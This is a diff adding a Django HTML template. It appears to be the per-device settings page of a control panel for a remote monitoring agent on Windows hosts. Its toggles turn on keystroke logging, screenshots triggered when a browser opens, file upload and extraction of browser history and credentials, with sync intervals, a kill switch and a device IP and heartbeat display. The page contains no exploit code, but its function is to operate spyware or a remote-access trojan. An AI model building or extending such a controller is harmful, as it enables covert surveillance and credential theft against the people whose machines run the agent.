@@ -1,0 +1,231 @@
+{% extends 'base.html' %}
+
+{% block title %}{{ device.hostname }} Settings - Controller{% endblock %}
+{% block page_title %}{{ device.hostname }} - Settings{% endblock %}
+
+{% block content %}
+<div style="display: flex; gap: 12px; margin-bottom: 24px;">
+    <a href="{% url 'device_detail' device.device_id %}" class="btn btn-secondary">
+        <i class="ph ph-arrow-left"></i>
+        Back to Device
+    </a>
+</div>
+
+<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 24px;">
+    <!-- Device Config -->
+    <div class="card fade-in">
+        <div class="card-header">
+            <h3 class="card-title">Device Configuration</h3>
+        </div>
+        <div class="card-body">
+            <form method="post" action="">
+                {% csrf_token %}
+                
+                <!-- Kill Switch -->
+                <div style="display: flex; justify-content: space-between; align-items: center; padding: 16px; background: var(--bg-tertiary); border-radius: var(--radius-md); margin-bottom: 16px; border: 1px solid {% if config.kill_switch %}var(--danger){% else %}var(--border-color){% endif %};">
+                    <div>
+                        <div style="font-weight: 500; {% if config.kill_switch %}color: var(--danger);{% endif %}">
+                            <i class="ph ph-warning-circle" style="margin-right: 8px;"></i>
+                            Kill Switch
+                        </div>
+                        <div style="font-size: 12px; color: var(--text-muted); margin-top: 4px;">Disable this device's agent</div>
+                    </div>
+                    <label style="position: relative; display: inline-block; width: 52px; height: 28px;">
+                        <input type="checkbox" name="kill_switch" {% if config.kill_switch %}checked{% endif %} style="opacity: 0; width: 0; height: 0;" onchange="this.parentElement.querySelector('.toggle-slider').style.background = this.checked ? 'var(--danger)' : '#374151'; this.parentElement.querySelector('.toggle-slider span').style.left = this.checked ? '28px' : '4px';">
+                        <span class="toggle-slider" style="position: absolute; cursor: pointer; inset: 0; background: {% if config.kill_switch %}var(--danger){% else %}#374151{% endif %}; border-radius: 28px; transition: 0.3s;">
+                            <span style="position: absolute; height: 20px; width: 20px; left: {% if config.kill_switch %}28px{% else %}4px{% endif %}; bottom: 4px; background: white; border-radius: 50%; transition: 0.3s;"></span>
+                        </span>
+                    </label>
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; font-size: 14px; font-weight: 500; margin-bottom: 8px;">Screenshot Quality</label>
+                    <input type="number" name="screenshot_quality" value="{{ config.screenshot_quality }}" min="10" max="100" style="width: 100%; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 12px; color: var(--text-primary); font-size: 14px;">
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; font-size: 14px; font-weight: 500; margin-bottom: 8px;">Config Sync Interval (seconds)</label>
+                    <input type="number" name="sync_interval" value="{{ config.config_sync_interval }}" min="60" style="width: 100%; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 12px; color: var(--text-primary); font-size: 14px;">
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; font-size: 14px; font-weight: 500; margin-bottom: 8px;">Keylog Sync Interval (seconds)</label>
+                    <input type="number" name="keylog_interval" value="{{ config.keylog_sync_interval }}" min="60" style="width: 100%; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 12px; color: var(--text-primary); font-size: 14px;">
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; font-size: 14px; font-weight: 500; margin-bottom: 8px;">Browser Data Sync Interval (seconds)</label>
+                    <input type="number" name="browser_interval" value="{{ config.browser_history_sync_interval }}" min="300" style="width: 100%; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 12px; color: var(--text-primary); font-size: 14px;">
+                </div>
+                
+                <button type="submit" class="btn btn-primary" style="width: 100%;">
+                    <i class="ph ph-floppy-disk"></i>
+                    Save Configuration
+                </button>
+            </form>
+        </div>
+    </div>
+    
+    <!-- Feature Toggles -->
+    <div class="card fade-in">
+        <div class="card-header">
+            <h3 class="card-title">Feature Toggles</h3>
+        </div>
+        <div class="card-body">
+            <form method="post" action="">
+                {% csrf_token %}
+                <input type="hidden" name="form_type" value="features">
+                
+                <div style="display: flex; justify-content: space-between; align-items: center; padding: 16px; background: var(--bg-tertiary); border-radius: var(--radius-md); margin-bottom: 12px;">
+                    <div>
+                        <div style="font-weight: 500;">Screenshots Enabled</div>
+                        <div style="font-size: 12px; color: var(--text-muted);">Allow screenshot capture</div>
+                    </div>
+                    <label style="position: relative; display: inline-block; width: 52px; height: 28px;">
+                        <input type="checkbox" name="screenshots_enabled" {% if config.screenshots_enabled %}checked{% endif %} style="opacity: 0; width: 0; height: 0;" onchange="this.parentElement.querySelector('.toggle-slider').style.background = this.checked ? 'var(--success)' : '#374151'; this.parentElement.querySelector('.toggle-slider span').style.left = this.checked ? '28px' : '4px';">
+                        <span class="toggle-slider" style="position: absolute; cursor: pointer; inset: 0; background: {% if config.screenshots_enabled %}var(--success){% else %}#374151{% endif %}; border-radius: 28px; transition: 0.3s;">
+                            <span style="position: absolute; height: 20px; width: 20px; left: {% if config.screenshots_enabled %}28px{% else %}4px{% endif %}; bottom: 4px; background: white; border-radius: 50%; transition: 0.3s;"></span>
+                        </span>
+                    </label>
+                </div>
+                
+                <div style="display: flex; justify-content: space-between; align-items: center; padding: 16px; background: var(--bg-tertiary); border-radius: var(--radius-md); margin-bottom: 12px;">
+                    <div>
+                        <div style="font-weight: 500;">Keylogger Enabled</div>
+                        <div style="font-size: 12px; color: var(--text-muted);">Enable keystroke logging</div>
+                    </div>
+                    <label style="position: relative; display: inline-block; width: 52px; height: 28px;">
+                        <input type="checkbox" name="keylogger_enabled" {% if config.keylogger_enabled %}checked{% endif %} style="opacity: 0; width: 0; height: 0;" onchange="this.parentElement.querySelector('.toggle-slider').style.background = this.checked ? 'var(--success)' : '#374151'; this.parentElement.querySelector('.toggle-slider span').style.left = this.checked ? '28px' : '4px';">
+                        <span class="toggle-slider" style="position: absolute; cursor: pointer; inset: 0; background: {% if config.keylogger_enabled %}var(--success){% else %}#374151{% endif %}; border-radius: 28px; transition: 0.3s;">
+                            <span style="position: absolute; height: 20px; width: 20px; left: {% if config.keylogger_enabled %}28px{% else %}4px{% endif %}; bottom: 4px; background: white; border-radius: 50%; transition: 0.3s;"></span>
+                        </span>
+                    </label>
+                </div>
+                
+                <div style="display: flex; justify-content: space-between; align-items: center; padding: 16px; background: var(--bg-tertiary); border-radius: var(--radius-md); margin-bottom: 12px;">
+                    <div>
+                        <div style="font-weight: 500;">Browser Trigger</div>
+                        <div style="font-size: 12px; color: var(--text-muted);">Screenshot on browser launch</div>
+                    </div>
+                    <label style="position: relative; display: inline-block; width: 52px; height: 28px;">
+                        <input type="checkbox" name="browser_trigger" {% if config.screenshot_on_browser %}checked{% endif %} style="opacity: 0; width: 0; height: 0;" onchange="this.parentElement.querySelector('.toggle-slider').style.background = this.checked ? 'var(--success)' : '#374151'; this.parentElement.querySelector('.toggle-slider span').style.left = this.checked ? '28px' : '4px';">
+                        <span class="toggle-slider" style="position: absolute; cursor: pointer; inset: 0; background: {% if config.screenshot_on_browser %}var(--success){% else %}#374151{% endif %}; border-radius: 28px; transition: 0.3s;">
+                            <span style="position: absolute; height: 20px; width: 20px; left: {% if config.screenshot_on_browser %}28px{% else %}4px{% endif %}; bottom: 4px; background: white; border-radius: 50%; transition: 0.3s;"></span>
+                        </span>
+                    </label>
+                </div>
+                
+                <div style="display: flex; justify-content: space-between; align-items: center; padding: 16px; background: var(--bg-tertiary); border-radius: var(--radius-md); margin-bottom: 12px;">
+                    <div>
+                        <div style="font-weight: 500;">File Upload Enabled</div>
+                        <div style="font-size: 12px; color: var(--text-muted);">Allow file uploads</div>
+                    </div>
+                    <label style="position: relative; display: inline-block; width: 52px; height: 28px;">
+                        <input type="checkbox" name="file_upload" {% if config.file_upload_enabled %}checked{% endif %} style="opacity: 0; width: 0; height: 0;" onchange="this.parentElement.querySelector('.toggle-slider').style.background = this.checked ? 'var(--success)' : '#374151'; this.parentElement.querySelector('.toggle-slider span').style.left = this.checked ? '28px' : '4px';">
+                        <span class="toggle-slider" style="position: absolute; cursor: pointer; inset: 0; background: {% if config.file_upload_enabled %}var(--success){% else %}#374151{% endif %}; border-radius: 28px; transition: 0.3s;">
+                            <span style="position: absolute; height: 20px; width: 20px; left: {% if config.file_upload_enabled %}28px{% else %}4px{% endif %}; bottom: 4px; background: white; border-radius: 50%; transition: 0.3s;"></span>
+                        </span>
+                    </label>
+                </div>
+
+                <div style="display: flex; justify-content: space-between; align-items: center; padding: 16px; background: var(--bg-tertiary); border-radius: var(--radius-md); margin-bottom: 12px;">
+                    <div>
+                        <div style="font-weight: 500;">Browser Data Enabled</div>
+                        <div style="font-size: 12px; color: var(--text-muted);">Extract history and credentials</div>
+                    </div>
+                    <label style="position: relative; display: inline-block; width: 52px; height: 28px;">
+                        <input type="checkbox" name="browser_data" {% if config.browser_data_enabled %}checked{% endif %} style="opacity: 0; width: 0; height: 0;" onchange="this.parentElement.querySelector('.toggle-slider').style.background = this.checked ? 'var(--success)' : '#374151'; this.parentElement.querySelector('.toggle-slider span').style.left = this.checked ? '28px' : '4px';">
+                        <span class="toggle-slider" style="position: absolute; cursor: pointer; inset: 0; background: {% if config.browser_data_enabled %}var(--success){% else %}#374151{% endif %}; border-radius: 28px; transition: 0.3s;">
+                            <span style="position: absolute; height: 20px; width: 20px; left: {% if config.browser_data_enabled %}28px{% else %}4px{% endif %}; bottom: 4px; background: white; border-radius: 50%; transition: 0.3s;"></span>
+                        </span>
+                    </label>
+                </div>
+                
+                <button type="submit" class="btn btn-primary" style="width: 100%; margin-top: 12px;">
+                    <i class="ph ph-floppy-disk"></i>
+                    Save Features
+                </button>
+            </form>
+        </div>
+    </div>
+</div>
+
+<!-- Device Info -->
+<div class="card fade-in" style="margin-top: 24px;">
+    <div class="card-header">
+        <h3 class="card-title">Device Information</h3>
+    </div>
+    <div class="card-body">
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px;">
+            <div style="padding: 16px; background: var(--bg-tertiary); border-radius: var(--radius-md);">
+                <div style="font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;">Hostname</div>
+                <div style="font-size: 14px; font-weight: 500;">{{ device.hostname }}</div>
+            </div>
+            <div style="padding: 16px; background: var(--bg-tertiary); border-radius: var(--radius-md);">
+                <div style="font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;">Device ID</div>
+                <div style="font-size: 12px; font-family: monospace;">{{ device.device_id }}</div>
+            </div>
+            <div style="padding: 16px; background: var(--bg-tertiary); border-radius: var(--radius-md);">
+                <div style="font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;">OS Version</div>
+                <div style="font-size: 14px; font-weight: 500;">{{ device.os_version|default:"Windows" }}</div>
+            </div>
+            <div style="padding: 16px; background: var(--bg-tertiary); border-radius: var(--radius-md);">
+                <div style="font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;">IP Address</div>
+                <div style="font-size: 14px; font-family: monospace;">{{ device.ip_address|default:"Unknown" }}</div>
+            </div>
+            <div style="padding: 16px; background: var(--bg-tertiary); border-radius: var(--radius-md);">
+                <div style="font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;">First Seen</div>
+                <div style="font-size: 14px;">{{ device.created_at|date:"M d, Y H:i" }}</div>
+            </div>
+            <div style="padding: 16px; background: var(--bg-tertiary); border-radius: var(--radius-md);">
+                <div style="font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;">Last Heartbeat</div>
+                <div style="font-size: 14px;">{{ device.last_seen|timesince }} ago</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Danger Zone -->
+<div class="card fade-in" style="margin-top: 24px; border-color: var(--danger);">
+    <div class="card-header" style="border-color: var(--danger);">
+        <h3 class="card-title" style="color: var(--danger);">
+            <i class="ph ph-warning" style="margin-right: 8px;"></i>
+            Danger Zone
+        </h3>
+    </div>
+    <div class="card-body">
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+            <div>
+                <div style="font-weight: 500;">Delete Device</div>
+                <div style="font-size: 13px; color: var(--text-muted);">Permanently remove this device and all associated data.</div>
+            </div>
+            <button class="btn btn-danger" onclick="confirmDelete()">
+                <i class="ph ph-trash"></i>
+                Delete Device
+            </button>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+function confirmDelete() {
+    if (confirm('Are you sure you want to delete this device? This action cannot be undone.')) {
+        fetch('{% url "device_delete" device.device_id %}', {
+            method: 'DELETE',
+            headers: {
+                'X-CSRFToken': '{{ csrf_token }}'
+            }
+        })
+        .then(res => {
+            if (res.ok) {
+                window.location.href = '{% url "devices" %}';
+            } else {
+                alert('Failed to delete device');
+            }
+        });
+    }
+}
+</script>
+{% endblock %}
